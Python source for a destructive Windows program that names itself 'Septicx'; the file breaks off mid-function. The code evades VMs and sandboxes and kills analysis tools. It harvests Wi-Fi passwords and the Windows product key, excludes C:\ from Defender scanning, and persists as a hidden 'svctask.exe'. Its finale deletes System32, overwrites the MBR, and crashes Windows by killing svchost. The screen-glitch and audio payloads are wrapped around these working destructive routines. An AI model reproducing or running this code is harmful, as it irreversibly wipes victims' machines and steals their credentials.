import subprocess, pythoncom, requests, threading, winsound, random, ctypes, winreg, base64, \
    psutil, shutil, msvcrt, time, shlex, json, uuid, math, mss, sys, wmi, ssl, io, os
from base64 import b64decode as O0O000OOO00O0OOO0
from math import sqrt, sin, tan
from functools import partial
from winapy_user import *
from winapy_con import *
from winapy_mme import *
from win32file import*
from re import findall
from win32gui import*
from win32con import*
from win32api import*
from win32ui import*
from ctypes import*

from colorsys import hsv_to_rgb
from tkinter import Tk

class Env:
    @staticmethod
    def check_vm(hwid, ip, user):
        blacklisted_users = [
            "WDAGUtilityAccount", "Abby", "Peter Wilson", "hmarc", "patex", "Administrator", "edkell", "stephpie",
            "JOHN-PC", "RDhJ0CNFevzX", "kEecfMwgj", "Frank", "8Nl0ColNQ5bq", "Lisa", "John", "george", "PxmdUOpVyx",
            "8VizSM", "w0fjuOVmCcP5A", "lmVwjj9b", "PqONjHVwexsS", "3u2v9m8", "Julia", "HEUeRzl"
        ]
        blacklisted_pc_names = [
            "BEE7370C-8C0C-4", "DESKTOP-NAKFFMT", "WIN-5E07COS9ALR", "B30F0242-1C6A-4",
            "DESKTOP-VRSQLAG", "Q9IATRKPRH", "XC64ZB", "DESKTOP-D019GDM", "DESKTOP-WI8CLET",
            "SERVER1", "LISA-PC", "JOHN-PC", "DESKTOP-B0T93D6", "DESKTOP-1PYKP29", "DESKTOP-1Y2433R",
            "WILEYPC", "WORK", "6C4E733F-C2D9-4", "RALPHS-PC", "DESKTOP-WG3MYJS", "DESKTOP-7XC6GEZ",
            "DESKTOP-5OV9S0O", "QarZhrdBpj", "ORELEEPC", "ARCHIBALDPC", "JULIA-PC", "d1bnJkfVlH",
        ]
        blacklisted_hwids = [
            "7AB5C494-39F5-4941-9163-47F54D6D5016", "032E02B4-0499-05C3-0806-3C0700080009",
            "03DE0294-0480-05DE-1A06-350700080009", "11111111-2222-3333-4444-555555555555",
            "6F3CA5EC-BEC9-4A4D-8274-11168F640058", "ADEEEE9E-EF0A-6B84-B14B-B83A54AFC548",
            "4C4C4544-0050-3710-8058-CAC04F59344A", "00000000-0000-0000-0000-AC1F6BD04972",
            "79AF5279-16CF-4094-9758-F88A616D81B4", "5BD24D56-789F-8468-7CDC-CAA7222CC121",
            "49434D53-0200-9065-2500-65902500E439", "49434D53-0200-9036-2500-36902500F022",
            "777D84B3-88D1-451C-93E4-D235177420A7", "49434D53-0200-9036-2500-369025000C65",
            "B1112042-52E8-E25B-3655-6A4F54155DBF", "00000000-0000-0000-0000-AC1F6BD048FE",
            "EB16924B-FB6D-4FA1-8666-17B91F62FB37", "A15A930C-8251-9645-AF63-E45AD728C20C",
            "67E595EB-54AC-4FF0-B5E3-3DA7C7B547E3", "C7D23342-A5D4-68A1-59AC-CF40F735B363",
            "63203342-0EB0-AA1A-4DF5-3FB37DBB0670", "44B94D56-65AB-DC02-86A0-98143A7423BF",
            "6608003F-ECE4-494E-B07E-1C4615D1D93C", "D9142042-8F51-5EFF-D5F8-EE9AE3D1602A",
            "49434D53-0200-9036-2500-369025003AF0", "8B4E8278-525C-7343-B825-280AEBCD3BCB",
            "4D4DDC94-E06C-44F4-95FE-33A1ADA5AC27",
        ]

        blacklisted_processes = [
            "httpdebuggerui", "wireshark", "fiddler", "regedit", "tasklist", "taskkill", "taskmgr", "mmc",
            "vboxservice", "df5serv", "processhacker", "vboxtray", "vmtoolsd", "vmwaretray", "ida64", "ollydbg",
            "pestudio", "vmwareuser", "vgauthservice", "vmacthlp", "x96dbg", "vmsrvc", "x32dbg", "vmusrvc", "prl_cc",
            "prl_tools", "xenservice", "qemu-ga", "joeboxcontrol", "ksdumperclient", "ksdumper", "joeboxserver"
        ]

        blacklisted_ips = [
            '88.132.231.71', '78.139.8.50', '20.99.160.173', '88.153.199.169', '84.147.62.12', '194.154.78.160',
            '92.211.109.160', '195.74.76.222', '188.105.91.116', '34.105.183.68', '92.211.55.199', '79.104.209.33',
            '95.25.204.90', '34.145.89.174', '109.74.154.90', '109.145.173.169', '34.141.146.114', '212.119.227.151',
            '195.239.51.59', '192.40.57.234', '64.124.12.162', '34.142.74.220', '188.105.91.173', '109.74.154.91',
            '34.105.72.241', '109.74.154.92', '213.33.142.50', '109.74.154.91', '93.216.75.209', '192.87.28.103',
            '88.132.226.203', '195.181.175.105', '88.132.225.100', '92.211.192.144', '34.83.46.130', '188.105.91.143',
            '34.85.243.241', '34.141.245.25', '178.239.165.70', '84.147.54.113', '193.128.114.45', '95.25.81.24',
            '92.211.52.62', '88.132.227.238', '35.199.6.13', '80.211.0.97', '34.85.253.170', '23.128.248.46',
            '35.229.69.227', '34.138.96.23', '192.211.110.74', '35.237.47.12', '87.166.50.213', '34.253.248.228',
            '212.119.227.167', '193.225.193.201', '34.145.195.58', '34.105.0.27', '195.239.51.3', '35.192.93.107'
        ]

        blacklisted_macs = [
            '00:15:5d:00:07:34', '00:e0:4c:b8:7a:58', '00:0c:29:2c:c1:21', '00:25:90:65:39:e4', 'c8:9f:1d:b6:58:e4',
            '00:25:90:36:65:0c', '00:15:5d:00:00:f3', '2e:b8:24:4d:f7:de', '00:15:5d:13:6d:0c', '00:50:56:a0:dd:00',
            '00:15:5d:13:66:ca', '56:e8:92:2e:76:0d', 'ac:1f:6b:d0:48:fe', '00:e0:4c:94:1f:20', '00:15:5d:00:05:d5',
            '00:e0:4c:4b:4a:40', '42:01:0a:8a:00:22', '00:1b:21:13:15:20', '00:15:5d:00:06:43', '00:15:5d:1e:01:c8',
            '00:50:56:b3:38:68', '60:02:92:3d:f1:69', '00:e0:4c:7b:7b:86', '00:e0:4c:46:cf:01', '42:85:07:f4:83:d0',
            '56:b0:6f:ca:0a:e7', '12:1b:9e:3c:a6:2c', '00:15:5d:00:1c:9a', '00:15:5d:00:1a:b9', 'b6:ed:9d:27:f4:fa',
            '00:15:5d:00:01:81', '4e:79:c0:d9:af:c3', '00:15:5d:b6:e0:cc', '00:15:5d:00:02:26', '00:50:56:b3:05:b4',
            '1c:99:57:1c:ad:e4', '08:00:27:3a:28:73', '00:15:5d:00:00:c3', '00:50:56:a0:45:03', '12:8a:5c:2a:65:d1',
            '00:25:90:36:f0:3b', '00:1b:21:13:21:26', '42:01:0a:8a:00:22', '00:1b:21:13:32:51', 'a6:24:aa:ae:e6:12',
            '08:00:27:45:13:10', '00:1b:21:13:26:44', '3c:ec:ef:43:fe:de', 'd4:81:d7:ed:25:54', '00:25:90:36:65:38',
            '00:03:47:63:8b:de', '00:15:5d:00:05:8d', '00:0c:29:52:52:50', '00:50:56:b3:42:33', '3c:ec:ef:44:01:0c',
            '06:75:91:59:3e:02', '42:01:0a:8a:00:33', 'ea:f6:f1:a2:33:76', 'ac:1f:6b:d0:4d:98', '1e:6c:34:93:68:64',
            '00:50:56:a0:61:aa', '42:01:0a:96:00:22', '00:50:56:b3:21:29', '00:15:5d:00:00:b3', '96:2b:e9:43:96:76',
            'b4:a9:5a:b1:c6:fd', 'd4:81:d7:87:05:ab', 'ac:1f:6b:d0:49:86', '52:54:00:8b:a6:08', '00:0c:29:05:d8:6e',
            '00:23:cd:ff:94:f0', '00:e0:4c:d6:86:77', '3c:ec:ef:44:01:aa', '00:15:5d:23:4c:a3', '00:1b:21:13:33:55',
            '00:15:5d:00:00:a4', '16:ef:22:04:af:76', '00:15:5d:23:4c:ad', '1a:6c:62:60:3b:f4', '00:15:5d:00:00:1d',
            '00:50:56:a0:cd:a8', '00:50:56:b3:fa:23', '52:54:00:a0:41:92', '00:50:56:b3:f6:57', '00:e0:4c:56:42:97',
            'ca:4d:4b:ca:18:cc', 'f6:a5:41:31:b2:78', 'd6:03:e4:ab:77:8e', '00:50:56:ae:b2:b0', '00:50:56:b3:94:cb',
            '42:01:0a:8e:00:22', '00:50:56:b3:4c:bf', '00:50:56:b3:09:9e', '00:50:56:b3:38:88', '00:50:56:a0:d0:fa',
            '00:50:56:b3:91:c8', '3e:c1:fd:f1:bf:71', '00:50:56:a0:6d:86', '00:50:56:a0:af:75', '00:50:56:b3:dd:03',
            'c2:ee:af:fd:29:21', '00:50:56:b3:ee:e1', '00:50:56:a0:84:88', '00:1b:21:13:32:20', '3c:ec:ef:44:00:d0',
            '00:50:56:ae:e5:d5', '00:50:56:97:f6:c8', '52:54:00:ab:de:59', '00:50:56:b3:9e:9e', '00:50:56:a0:39:18',
            '32:11:4d:d0:4a:9e', '00:50:56:b3:d0:a7', '94:de:80:de:1a:35', '00:50:56:ae:5d:ea', '00:50:56:b3:14:59',
            'ea:02:75:3c:90:9f', '00:e0:4c:44:76:54', 'ac:1f:6b:d0:4d:e4', '52:54:00:3b:78:24', '00:50:56:b3:50:de',
            '7e:05:a3:62:9c:4d', '52:54:00:b3:e4:71', '90:48:9a:9d:d5:24', '00:50:56:b3:3b:a6', '92:4c:a8:23:fc:2e',
            '5a:e2:a6:a4:44:db', '00:50:56:ae:6f:54', '42:01:0a:96:00:33', '00:50:56:97:a1:f8', '5e:86:e4:3d:0d:f6',
            '00:50:56:b3:ea:ee', '3e:53:81:b7:01:13', '00:50:56:97:ec:f2', '00:e0:4c:b3:5a:2a', '12:f8:87:ab:13:ec',
            '00:50:56:a0:38:06', '2e:62:e8:47:14:49', '00:0d:3a:d2:4f:1f', '60:02:92:66:10:79', '00:50:56:a0:d7:38',
            'be:00:e5:c5:0c:e5', '00:50:56:a0:59:10', '00:50:56:a0:06:8d', '00:e0:4c:cb:62:08', '4e:81:81:8e:22:4e',
            ''
        ]

        victim = user
        victim_pc = os.getenv("COMPUTERNAME")

        for path in [r'D:\Tools', r'D:\OS2', r'D:\NT3X']:
            if os.path.exists(path):
                return True

        if (victim in blacklisted_users) or \
                (victim_pc in blacklisted_pc_names) or \
                (hwid in blacklisted_hwids) or \
                (ip in blacklisted_ips) or \
                (':'.join(findall('..', '%012x' % uuid.getnode())) in blacklisted_macs):
            return True

        os_name, version, cpu, ram, gpu, drive_size, drive_used = Env.hardware_info()
        cores = os.cpu_count()

        if (drive_size < 100) or ("V" in gpu.upper()) or (ram < 6) or ("Enterprise" in os_name) or (cores < 6) or (cores % 2):
            return True

        for proc in psutil.process_iter():
            try:
                if any(procstr in proc.name().lower() for procstr in blacklisted_processes):
                    proc.kill()
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                pass

    @staticmethod
    def executable_path(filename=""):
        if getattr(sys, 'frozen', False):
            try:
                application_path = sys._MEIPASS
            except:
                application_path = os.path.abspath(".")

        else:
            try:
                application_path = os.path.dirname('__file__')
            except:
                application_path = os.path.dirname(os.path.abspath(__file__))

        if filename:
            filename = "\\"+filename
        return application_path+filename

    @staticmethod
    def bsod():
        for proc in psutil.process_iter():
            try:
                proc.name()
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                pass

            if proc.name() == "svchost.exe":
                try:
                    proc.kill()
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    pass

    @staticmethod
    def overwrite_mbr():
        device = CreateFileW("\\\\.\\PhysicalDrive0",
                                GENERIC_WRITE,
                                FILE_SHARE_READ | FILE_SHARE_WRITE,
                                None, OPEN_EXISTING, 0, 0
                            )
        
        buffer = bytes([
            0xE8, 0x15, 0x00, 0xBB, 0x27, 0x7C, 0x8A, 0x07, 0x3C, 0x00, 0x74, 0x0B, 0xE8, 0x03, 0x00, 0x43,
            0xEB, 0xF4, 0xB4, 0x0E, 0xCD, 0x10, 0xC3, 0xC3, 0xB4, 0x07, 0xB0, 0x00, 0xB7, 0x04, 0xB9, 0x00,
            0x00, 0xBA, 0x4F, 0x18, 0xCD, 0x10, 0xC3, 0x54, 0x68, 0x65, 0x20, 0x77, 0x6F, 0x72, 0x6D, 0x20,
            0x68, 0x61, 0x73, 0x20, 0x65, 0x61, 0x74, 0x65, 0x6E, 0x20, 0x69, 0x74, 0x27, 0x73, 0x20, 0x77,
            0x61, 0x79, 0x20, 0x74, 0x68, 0x72, 0x6F, 0x75, 0x67, 0x68, 0x20, 0x79, 0x6F, 0x75, 0x72, 0x20,
            0x63, 0x6F, 0x6D, 0x70, 0x75, 0x74, 0x65, 0x72, 0x2E, 0x0D, 0x0A, 0x47, 0x6F, 0x6F, 0x64, 0x6E,
            0x69, 0x67, 0x68, 0x74, 0x2E, 0x0D, 0x0A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xAA
        ])

        WriteFile(device, buffer, None)
        CloseHandle(device)

    @staticmethod
    def network_passwords():
        meta_data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles'])
        data = meta_data.decode('utf-8', errors="backslashreplace")
        data = data.split('\n')
        names = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
        dictionary = {}
        for name in names:
            try:
                results = [
                    b.split(":")[1][1:-1] for b in subprocess.check_output(
                        f'netsh wlan show profile {name} key = clear'
                    ).decode(
                        'utf-8', errors="backslashreplace"
                    ).split('\n') if "Key Content" in b]
                if results:
                    dictionary[name] = results[0]
                else:
                    dictionary[name] = ""
            except subprocess.CalledProcessError:
                pass

        return dictionary

    @staticmethod
    def decode_key(rpk):
        rpk_offset = 52
        i = 28
        sz_possible_chars = "BCDFGHJKMPQRTVWXY2346789"
        szProductKey = ""

        while i >= 0:
            dwAccumulator = 0
            j = 14
            while j >= 0:
                dwAccumulator = dwAccumulator * 256
                d = rpk[j + rpk_offset]
                if isinstance(d, str):
                    d = ord(d)
                dwAccumulator = d + dwAccumulator
                rpk[j + rpk_offset] = int(dwAccumulator / 24) if int(dwAccumulator / 24) <= 255 else 255
                dwAccumulator = dwAccumulator % 24
                j = j - 1
            i = i - 1
            szProductKey = sz_possible_chars[dwAccumulator] + szProductKey

            if ((29 - i) % 6) == 0 and i != -1:
                i = i - 1
                szProductKey = "-" + szProductKey
        return szProductKey

    @staticmethod
    def get_product_key():
        pythoncom.CoInitialize()
        w = wmi.WMI()
        try:
            product_key = w.softwarelicensingservice()[0].OA3xOriginalProductKey
            if product_key != '':
                return product_key
        except AttributeError:
            product_key = None

        if not product_key:
            arch_keys = [0, winreg.KEY_WOW64_32KEY, winreg.KEY_WOW64_64KEY]
            for arch in arch_keys:
                try:
                    key = winreg.OpenKey(
                        winreg.HKEY_LOCAL_MACHINE,
                        'SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion',
                        0, winreg.KEY_READ | arch)

                    value, _ = winreg.QueryValueEx(key, 'DigitalProductID')
                    # Return the first match
                    return Env.decode_key(list(value))
                except (FileNotFoundError, TypeError):
                    pass

    @staticmethod
    def hardware_info():
        computer = wmi.WMI()
        os_info = computer.Win32_OperatingSystem()[0]
        proc_info = computer.Win32_Processor()[0]
        gpu_info = computer.Win32_VideoController()[0]

        os_name = os_info.Name.encode('utf-8').split(b'|')[0].decode()
        os_version = ' '.join([os_info.Version, os_info.BuildNumber])
        system_ram = float(os_info.TotalVisibleMemorySize) / 1048576  # KB to GB

        fan = psutil.disk_usage(path="C:/")

        return os_name, os_version, \
            proc_info.Name, system_ram, \
            gpu_info.Name, round(fan.total/1073741824, 2), \
            round(fan.used/1073741824, 2)

    @staticmethod
    def run_command(cmd):
        subprocess.call(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    @staticmethod
    def download(url, path):
        with open(path, "wb") as file:
            data = requests.get(url).content
            file.write(data)
            file.close()

class messagebox:
    @staticmethod
    def showerror(title, message):
        return ctypes.windll.user32.MessageBoxW(0, message, title, 16)

    @staticmethod
    def askquestion(title, message):
        return ctypes.windll.user32.MessageBoxW(0, message, title, 36) == 6

    @staticmethod
    def showwarning(title, message):
        return ctypes.windll.user32.MessageBoxW(0, message, title, 48)


class Troll:
    def __init__(self):
        self.xbase = Tk().winfo_screenwidth()
        self.ybase = Tk().winfo_screenheight()
        self.windows = []
        self.timeout = 0
        self.is_admin = ctypes.windll.shell32.IsUserAnAdmin()

        if self.is_admin:
            base = os.getenv('Systemroot')+'\\System32'
        else:
            base = os.getenv('LOCALAPPDATA')

        self.dir = f"{base}\\Windows Security"

    def start(self):
        is_admin = ctypes.windll.shell32.IsUserAnAdmin()

        if not is_admin:
            response = messagebox.askquestion("Septicx", "This malware WILL overwrite your MBR record, and make windows unbootable, Are you sure you want to run?")

            if not response:
                sys.exit(1)

            messagebox.showwarning("Septicx", "The first few payloads will last 5 minutes, then there will be the finale")

        if (not is_admin):
            filename = sys.executable.split("\\")[-1]
            old_count = self.count_proc_exists(filename)
                
            subprocess.call(f"""powershell -Command Start-Process '{sys.executable}' -Verb runAs""")
            time.sleep(0.1)

            count = self.count_proc_exists(filename)

            if count > old_count:
                sys.exit(1)

        self.timeout = time.time() + 300
        self.stopped = False

        threading.Thread(target=self.corrupt_text).start()
        threading.Thread(target=self.startup).start()

        threading.Thread(target=self.apply_func, args=((lambda x, y: x % (y + 1)), 30)).start()
        self.play_bytebeat(
            '((t | (t >> 12)) << 3) % 100', 
            30,         
            8000,
        )

        threading.Thread(target=self.mandelbrot, args=(30,)).start()
        self.play_bytebeat(
            '(t | (t >> 10)) << 2', 
            30,         
            8000,
        )

        threading.Thread(target=self.cube_draw, args=(30,)).start()
        self.play_bytebeat(
            't | (t >> 7)', 
            30,         
            8000,
        )

        threading.Thread(target=self.deep_fry, args=(30,)).start()
        self.play_bytebeat(
            't | (t >> 6) | int(tan(t))', 
            30,         
            8000,
        )

        for _ in range(3):
            threading.Thread(target=self.lines, args=(15,)).start()

        self.play_bytebeat(
            't | (t >> 5)', 
            15,         
            8000,
        )

        threading.Thread(target=self.intensify, args=(15,)).start()
        self.play_bytebeat(
            '((t | (t >> 13)) << 3) % 50', 
            15,         
            8000,
        )

        self.finale()

    def apply_func_thread(self, num_steps_x, num_steps_y, thread_index, size, iterations, threads, func):

        extra_x = 1 * (thread_index > (num_steps_x % threads))
        start_x = (num_steps_x // (threads - 4)) * thread_index
        end_x = (num_steps_x // (threads - 4)) * (thread_index + 1)


        hdc = windll.user32.GetDC(0)
        mem_dc = windll.gdi32.CreateCompatibleDC(hdc)
        line_bitmap = windll.gdi32.CreateBitmap(1, 1, 1, 1, None)

        mouse_x, mouse_y = GetCursorPos()

        for x in range(start_x, end_x):
            for y in range(num_steps_y):
                count = func((x+mouse_x), (y+mouse_y))

                hue = (count * 10 % 360) / 360.0

                r, g, b = hsv_to_rgb(hue, 1.0, 1.0)

                brush = CreateSolidBrush(RGB(
                    int(r * 255),
                    int(g * 255),
                    int(b * 255)
                ))

                SelectObject(hdc, brush)
                windll.gdi32.SetPixel(mem_dc, 0, 0, 0xFF0000)
                windll.gdi32.PatBlt(hdc, x * size, y * size, size, size, 0xF00021)

        windll.gdi32.DeleteObject(line_bitmap)
        windll.user32.ReleaseDC(0, hdc)
        windll.gdi32.DeleteDC(mem_dc)

    def apply_func(self, func, timeout=False):
        size = 10
        iterations = 20
        thread_count = 25

        threads = []

        screen_width, screen_height = GetSystemMetrics(0), GetSystemMetrics(1)

        num_steps_x = screen_width // size
        num_steps_y = screen_height // size

        if not timeout:
            timeout = self.timeout

        else:
            timeout = time.time() + timeout

        while time.time() < timeout and not self.stopped:

            for thread_index in range(thread_count + 1):
                thread = threading.Thread(target=self.apply_func_thread, args=(num_steps_x, num_steps_y, thread_index, size, iterations, thread_count, func))
                
                threads.append(thread)
                thread.start()

            for thread in threads:
                thread.join()

    def play_bytebeat(self, code, duration, hertz):
        Hz = hertz # Amount of samples per second
        SecondsToPlay = duration # The amount of seconds to play

        wvh = (WAVE_FORMAT_PCM, 1, Hz, Hz, 1, 8) # Settings ig

        hwo = waveOutOpen(WAVE_MAPPER, wvh, 0, 0, CALLBACK_NULL) # Open a new HWAVEOUT object
        data = bytearray(Hz * SecondsToPlay) # Create a bytearray

        for t in range(len(data)):
            data[t] = eval(code) % 256 # Put your bytebeat here! Don't forget to limit it to 255 though.

        pre_header = (data, 0, 0, 0, 0)
        prepared_header = waveOutPrepareHeader(hwo, pre_header) # Prepare the header

        waveOutWrite(hwo, prepared_header) # Write the buffer to the device

        waveOutUnprepareHeader(hwo, prepared_header) # Free memory from the header
        Sleep(1150 * SecondsToPlay) # Wait until it finished
        waveOutClose(hwo) # Close the handle object

    def mandelbrot_thread(self, num_steps_x, num_steps_y, thread_index, size, iterations, threads, c):

        extra_x = 1 * (thread_index > (num_steps_x % threads))
        start_x = (num_steps_x // (threads - 3)) * thread_index
        end_x = (num_steps_x // (threads - 3)) * (thread_index + 1)


        hdc = windll.user32.GetDC(0)
        mem_dc = windll.gdi32.CreateCompatibleDC(hdc)
        line_bitmap = windll.gdi32.CreateBitmap(1, 1, 1, 1, None)

        for x in range(start_x, end_x):
            for y in range(num_steps_y):
                count = 0
                real_part = (x / num_steps_x) * 2 -1
                imaginary_part = (y / num_steps_y) * 2 - 1
                complex_number = complex(real_part, imaginary_part)

                for i in range(iterations):
                    complex_number = complex_number ** 2 + c

                    if math.sqrt(complex_number.real**2 + complex_number.imag**2) > 2:
                        break

                    count += 4

                hue = (count * 10 % 360) / 360.0

                r, g, b = hsv_to_rgb(hue, 1.0, 1.0)

                brush = CreateSolidBrush(RGB(
                    int(r * 255),
                    int(g * 255),
                    int(b * 255)
                ))

                SelectObject(hdc, brush)
                windll.gdi32.SetPixel(mem_dc, 0, 0, 0xFF0000)
                windll.gdi32.PatBlt(hdc, x * size, y * size, size, size, 0xF00021)

        windll.gdi32.DeleteObject(line_bitmap)
        windll.user32.ReleaseDC(0, hdc)
        windll.gdi32.DeleteDC(mem_dc)

    def mandelbrot(self, timeout=False):
        size = 8
        iterations = 20
        thread_count = 20

        threads = []

        screen_width, screen_height = GetSystemMetrics(0), GetSystemMetrics(1)

        num_steps_x = screen_width // size
        num_steps_y = screen_height // size

        if not timeout:
            timeout = self.timeout

        else:
            timeout = time.time() + timeout

        while time.time() < timeout and not self.stopped:

            mouse_x, mouse_y = GetCursorPos()
            mouse_x /= screen_width / 4
            mouse_y /= screen_height / 4
            mouse_x -= 2
            mouse_y -= 2

            c = complex(mouse_x, mouse_y)


            for thread_index in range(thread_count):
                thread = threading.Thread(target=self.mandelbrot_thread, args=(num_steps_x, num_steps_y, thread_index, size, iterations, thread_count, c))
                
                threads.append(thread)
                thread.start()

            for thread in threads:
                thread.join()

    def stop(self):
        self.stopped = True
        ctypes.windll.user32.BlockInput(False)

    def count_proc_exists(self, proc_name):
        count = 0
        for proc in psutil.process_iter():
            try:
                if proc.name().lower() == proc_name:
                    count += 1
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                pass

        return count

    def finale(self):
        if self.stopped:
            return

        try:
            Env.run_command('''takeown /f "%WINDIR%\System32"''')
            Env.run_command('''icacls "%WINDIR%\System32" /grant everyone:F''')
            Env.run_command('''del "%WINDIR%\System32" /q''')
            ctypes.windll.user32.BlockInput(False)
            Env.overwrite_mbr()
        except:
            pass

        

        self.stopped = True

        answer = messagebox.askquestion("SepticX", "You ready for some more fun?")

        self.stopped = False

        if not answer:
            messagebox.showwarning("System Message", "Wrong answer :P")

        else:
            messagebox.showwarning("System Message", "Alright, get ready!")

        threading.Thread(target=self.apply_func, args=((lambda x, y: x ^ y), 10)).start()
        time.sleep(10)
        
        threading.Thread(target=self.apply_func, args=((lambda x, y: x | y), 10)).start()
        time.sleep(10)
        
        threading.Thread(target=self.apply_func, args=((lambda x, y: x & y), 10)).start()
        time.sleep(10)
        
        threading.Thread(target=self.apply_func, args=((lambda x, y: x % (y + 1)), 10)).start()
        time.sleep(10)

        threading.Thread(target=self.sines).start()
        time.sleep(20)

        Env.bsod()

    def startup(self):
        Env.run_command(f'attrib -s -h -r "{self.dir}"')

        if not os.path.exists(f'{self.dir}\\svctask.exe'):
            os.mkdir(self.dir)

            try:
                Env.run_command(f"""powershell Add-MpPreference -ExclusionPath 'C:\\'""")
            except:
                pass

            shutil.copy(sys.executable, f"{self.dir}\\svctask.exe")

            if self.is_admin:
                Env.run_command(f'''schtasks /Create /SC ONLOGON /TN WinSvctask /TR "{self.dir}\\svctask.exe" /RL HIGHEST /f''')

            else:
                hKey = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run")

                keys = []
                count = 0

                while True:
                    try:
                        name, value, type = winreg.EnumValue(hKey, count)
                    except WindowsError:
                        break

                    keys.append(name)
                    count += 1

                if not keys:
                    keys = ["WinSvcTask"]

                key = random.choice(keys) + "​"
                Env.run_command(f'''reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "{key}" /t REG_SZ /d "{self.dir}\\svctask.exe" /f''')

        Env.run_command('reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v "DisableRegistryTools" /t "REG_DWORD" /d "1" /f')
        Env.run_command(f'attrib +s +h +r "{self.dir}"')

    def block_keyboard(self, timeout=None):
        if not timeout:
            timeout = self.timeout

        else:
            timeout = time.time() + timeout

        while time.time() < timeout and not self.stopped:
            msvcrt.getwch()

    def block_mouse(self, timeout=None):
        x, y = GetSystemMetrics(0), GetSystemMetrics(1)

        if not timeout:
            timeout = self.timeout
        
        else:
            timeout = time.time() + timeout


        start = time.time()
        timestamp = (timeout - start)

        while time.time() < timeout and not self.stopped:
            elapsed = time.time() - start
            if elapsed / timestamp > 0.5:

                if GetCursorPos() != (0, 0):
                    SetCursorPos((random.randint(0, x), random.randint(0, y)))

            else:
                SetCursorPos((x // 2, y // 2))

            time.sleep(0.01)

    def open_sites(self, timeout=None):
        sites = [
                    "https://google.com/search?q=how to remove virus",
                    "https://google.com/search?q=how to get free robux",
                    "https://google.com/search?q=SepticX virus",
                    "https://www.youtube.com/watch?v=MtN1YnoL46Q",
                    "https://theannoyingsite.com/"
                ]

        if not timeout:
            timeout = self.timeout

        else:
            timeout = time.time() + timeout

        while time.time() < timeout and not self.stopped:
